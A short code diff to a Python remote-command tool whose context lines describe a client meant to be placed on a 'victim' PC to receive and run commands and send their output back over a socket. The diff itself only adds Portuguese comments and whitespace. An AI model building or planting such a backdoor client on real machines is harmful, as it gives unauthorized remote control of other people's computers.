@@ -34,6 +34,7 @@ def serv():
             print(conn.recv(2048)) # dobro pela ida e volta(ping pong)
 
 
+# cliente
 def client():
     """
     Cliente que será colocado no pc da vítima, ele, por sua vez, recebe e executa comandos
@@ -52,7 +53,8 @@ def client():
             s.send(terminal.stdout.read())
             s.send(terminal.stderr.read())
 
-
+            
+#funções auxiliares
 def main1():
     """
     executa o servidor
